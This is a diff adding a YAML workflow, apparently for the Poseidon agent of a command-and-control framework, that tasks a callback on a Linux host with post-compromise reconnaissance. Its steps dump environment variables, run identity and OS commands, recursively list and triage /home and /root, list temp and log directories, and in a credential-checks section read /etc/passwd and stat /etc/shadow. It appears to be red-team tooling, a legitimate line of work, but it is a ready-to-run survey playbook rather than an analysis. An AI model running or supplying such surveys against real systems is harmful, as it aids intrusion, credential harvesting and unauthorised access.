@@ -1,0 +1,247 @@
+name: "Poseidon Linux Survey"
+description: "Manual Poseidon Linux survey using native Poseidon commands where possible"
+trigger: manual
+run_as: self
+
+steps:
+  - name: "config"
+    description: "Get Poseidon configuration and host information"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    continue_on_error: true
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: config
+
+  - name: "getuser"
+    description: "Get current user context"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    continue_on_error: true
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: getuser
+
+  - name: "print c2"
+    description: "Print current C2 capabilities and configuration"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    continue_on_error: true
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: print_c2
+
+  - name: "timestamps"
+    description: "Collect local time, UTC time, and Unix epoch"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    continue_on_error: true
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: shell
+      params: "date; date -u; date +%s"
+
+  - name: "environment"
+    description: "Collect process environment variables"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    continue_on_error: true
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: getenv
+
+  - name: "host identity"
+    description: "Collect logged-in users, cwd, identity, kernel, hostname, and OS release data"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    continue_on_error: true
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: shell
+      params: "w; pwd; id; whoami; uname -a; hostname; cat /etc/os-*"
+
+  # Filesystem checks
+
+  - name: "ls home depth 2"
+    description: "Recursively list /home to depth 2"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    continue_on_error: true
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: ls
+      params_dictionary:
+        path: "/home"
+        depth: 2
+
+  - name: "triage home"
+    description: "Run Poseidon triagedirectory against /home"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    continue_on_error: true
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: triagedirectory
+      params: "/home"
+
+  - name: "ls root depth 2"
+    description: "Recursively list /root to depth 2"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    continue_on_error: true
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: ls
+      params_dictionary:
+        path: "/root"
+        depth: 2
+
+  - name: "triage root"
+    description: "Run Poseidon triagedirectory against /root"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    continue_on_error: true
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: triagedirectory
+      params: "/root"
+
+  - name: "ls opt"
+    description: "List /opt"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    continue_on_error: true
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: ls
+      params_dictionary:
+        path: "/opt"
+        depth: 1
+
+  - name: "ls srv"
+    description: "List /srv"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    continue_on_error: true
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: ls
+      params_dictionary:
+        path: "/srv"
+        depth: 1
+
+  - name: "ls filesystem root"
+    description: "List /"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    continue_on_error: true
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: ls
+      params_dictionary:
+        path: "/"
+        depth: 1
+
+  - name: "ls tmp"
+    description: "List /tmp"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    continue_on_error: true
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: ls
+      params_dictionary:
+        path: "/tmp"
+        depth: 1
+
+  - name: "ls dev shm"
+    description: "List /dev/shm"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    continue_on_error: true
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: ls
+      params_dictionary:
+        path: "/dev/shm"
+        depth: 1
+
+  - name: "ls var tmp"
+    description: "List /var/tmp"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    continue_on_error: true
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: ls
+      params_dictionary:
+        path: "/var/tmp"
+        depth: 1
+
+  - name: "ls var log depth 2"
+    description: "Recursively list /var/log to depth 2"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    continue_on_error: true
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: ls
+      params_dictionary:
+        path: "/var/log"
+        depth: 2
+
+  # Credential-related file checks
+
+  - name: "ls passwd"
+    description: "Get metadata for /etc/passwd"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    continue_on_error: true
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: ls
+      params_dictionary:
+        path: "/etc/passwd"
+        depth: 1
+
+  - name: "ls shadow"
+    description: "Get metadata for /etc/shadow"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    continue_on_error: true
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: ls
+      params_dictionary:
+        path: "/etc/shadow"
+        depth: 1
+
+  - name: "cat passwd"
+    description: "Read /etc/passwd"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    continue_on_error: true
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: cat
+      params: "/etc/passwd"
